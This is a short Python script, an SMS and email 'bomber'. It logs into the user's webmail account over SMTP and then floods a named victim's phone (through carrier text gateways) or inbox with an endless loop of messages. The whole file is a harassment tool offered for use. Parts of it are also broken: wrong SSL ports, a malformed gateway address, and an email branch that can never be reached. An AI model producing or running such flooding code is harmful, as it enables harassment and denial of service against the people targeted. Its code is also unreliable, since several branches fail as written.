#!/usr/bin/python3
# Originally Coded By: Max00355 - Forked by ZodiacGlass & Sheogorath


import smtplib as s
import getpass as g
import sys

print(""" Ready to fuck shit up?

1. Hell ya!
2. Wait, I'm not ready
""")
pro_opt = input()
print("\n\r")
if pro_opt == "1":
	#attack_pro = 0
	print(""" What is your email provider?
		1. Gmail
		2. Yahoo!
		3. Hotmail
	""")
	pro_option = input()
	if pro_option == "1":
		#attack_pro = 'gmail'
		username = input('Email Username:')
		password = g.getpass('Password:')
		server = s.SMTP_SSL('smtp.gmail.com',465)
		#server.starttls()
		server.login(username, password)
	if pro_option == "2":
		#attack_pro = 'yahoo'
		username = input('Email Username:')
		password = g.getpass('Password:')
		server = s.SMTP_SSL('smtp.mail.yahoo.com',587)
		#server.starttls()
		server.login(username, password)
	if pro_option == "3":
		#attack_pro = 'hotmail'
		username = input('Email Username:')
		password = g.getpass('Password:')
		server = s.SMTP_SSL('smtp.hotmail.com',587)
		#server.starttls()
		server.login(username, password)
	
	print( """ What would you like to do?

		1. Text Bomb
		2. Email Bomb
	""")
	option = input()
	print("\n\r")
	if option == "1":
		carrier_attack = 0
		print( """ What is their carrier?
		1. Alltel
		2. AT&T
		3. Rogers
		4. Sprint
		5. T-Mobile
		6. Telus
		7. Verizon
		8. Virgin Mobile
		9. Orange
		\n\r
		""")
		carrier = input()

		if carrier == "1":
			carrier_attack = "alltelmessage.com"
		if carrier == "2":
			carrier_attack = "@txt.att.net"
		if carrier == "3":
			carrier_attack = "@pcs.rogers.com"
		if carrier == "4":
			carrier_attack = "@messaging.sprintpcs.com"
		if carrier == "5":
			carrier_attack = "@tmomail.net"
		if carrier == "6":
			carrier_attack = "@msg.telus.com"
		if carrier == "7":
			carrier_attack = "@vtext.com"
		if carrier == "8":
			carrier_attack = "@vmobl.com"
		if carrier == "9":
			carrier_attack = "@sms.orange.pl"

		v_phone = input("Victim's Phone Number: ") + str(carrier_attack)
		message = input("Message: ")
		phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
			% (username, "" .join(v_phone), "" .join(message)))

		while option == "1":
			server.sendmail(username, v_phone, phone_message)
			print("Bombing... Press Ctrl + C To Stop")
		if option == "2":
			v_email = input("Victim's Email: ")
			message = input("Message: ")
			email_message = (" \r\n\r\n From: %s\r\n To: %s\r\n\r\n  %s"
							% (username, "" .join(v_email), "" .join(message)))
		while "1":
			server.sendmail(username, v_email, email_message)
			print("Bombing... Press Ctrl + C To Stop")
if pro_opt == "2":
	print(quit())
